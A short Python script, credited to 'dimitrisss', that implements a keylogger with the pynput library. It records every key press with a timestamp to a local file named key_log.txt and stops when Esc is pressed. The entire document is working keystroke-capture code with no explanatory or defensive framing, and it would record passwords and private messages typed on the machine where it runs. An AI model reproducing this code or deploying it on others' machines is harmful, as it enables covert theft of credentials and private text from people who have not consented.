##This code created by dimitrisss

from pynput.keyboard import Key, Listener
import logging

# Make a log file
log_dir = ""

# Setting up basic configuration for logging
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        # Return False to stop the listener
        return False
        
# Setting up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
